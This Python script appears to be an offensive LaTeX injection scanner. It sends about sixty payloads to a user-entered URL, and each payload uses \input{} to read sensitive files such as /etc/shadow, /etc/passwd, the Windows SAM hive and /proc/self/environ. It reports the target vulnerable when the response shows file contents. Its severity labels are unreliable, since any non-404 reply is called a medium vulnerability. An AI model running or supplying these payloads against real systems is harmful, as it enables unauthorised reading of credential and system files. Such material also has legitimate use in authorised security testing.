import requests
import re
import pyfiglet

ascii_banner = pyfiglet.figlet_format("LaTeX INJECTION")
print(ascii_banner)

# Function to test for LaTeX injection vulnerability
def test_latex_injection(url):
    print(f"Testing for LaTeX Injection vulnerability on: {url}")

    # List of payloads for testing sensitive information collection
    payloads = [
        r"\documentclass{article}\begin{document}\input{/etc/passwd}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/shadow}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/hosts}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/version}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/cpuinfo}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/meminfo}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/apache2/access.log}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/apache2/error.log}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/auth.log}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/secure}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/messages}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/syslog}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/mail.log}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/maillog}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/cron.log}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/cron}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/secure}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/wtmp}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/btmp}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/log/lastlog}\end{document}",
        # 50 more payloads from reference URL
        r"\documentclass{article}\begin{document}\input{C:/boot.ini}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Windows/system.ini}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Windows/win.ini}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Windows/System32/drivers/etc/hosts}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Windows/System32/config/system}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Windows/System32/config/software}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Windows/System32/config/security}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Windows/System32/config/SAM}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Windows/System32/config/default}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Users/Public}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Users/Default}\end{document}",
        r"\documentclass{article}\begin{document}\input{C:/Users/All Users}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/resolv.conf}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/network/interfaces}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/protocols}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/services}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/apt/sources.list}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/fstab}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/crontab}\end{document}",
        r"\documentclass{article}\begin{document}\input{/etc/ssh/sshd_config}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/spool/mail/root}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/spool/cron/crontabs/root}\end{document}",
        r"\documentclass{article}\begin{document}\input{/var/lib/dhcp/dhclient.leases}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/scsi/scsi}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/filesystems}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/cmdline}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/environ}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/status}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/mounts}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/net/tcp}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/net/udp}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/net/dev}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/net/raw}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/net/unix}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/kallsyms}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/config.gz}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/modules}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/stat}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/loadavg}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/mounts}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/uptime}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/mounts}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/self/net/if_inet6}\end{document}",
        r"\documentclass{article}\begin{document}\input{/proc/net/route}\end{document}",
    ]
    
    payload_vars = {f"LI{i+1}": payload for i, payload in enumerate(payloads)}

    # Variable to track if sensitive information was found
    vulnerable = False
    successful_payload = None

    # Sending requests with each payload
    for var_name, payload in payload_vars.items():
        print(f"Sending request with payload: {payload}")
        response = requests.post(url, data={"payload": payload})

        # Check if the response contains sensitive information
        if re.search(r'(root:|processor)', response.text):
            print(f"{var_name}: High Vulnerability Detected with payload: {payload}")
            successful_payload = (var_name, payload, "high")
            vulnerable = True
            break
        elif response.status_code == 404:
            print(f"{var_name}: Low Vulnerability Detected: 404 Not Found for payload: {payload}")
        else:
            print(f"{var_name}: Medium Vulnerability Detected with status code {response.status_code} for payload: {payload}")

    # Confirm if the target is vulnerable or not
    if vulnerable:
        print("\nThe target website is vulnerable to LaTeX Injection! This vulnerability is classified as high.")
        print("\nSuccessfully Injected Payload Details:")
        print(f"Variable Name: {successful_payload[0]}")
        print(f"Payload: {successful_payload[1]}")
        print(f"Vulnerability Metric: {successful_payload[2]}")
    else:
        print("The target website is not vulnerable to LaTeX Injection. No further action required.")

def main():
    # Prompt user for target website URL
    target_url = input("Enter your target website URL: ").strip()
    # Check if the URL starts with 'http://' or 'https://'
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url

    # Test for LaTeX Injection vulnerability
    test_latex_injection(target_url)

if __name__ == "__main__":
    main()
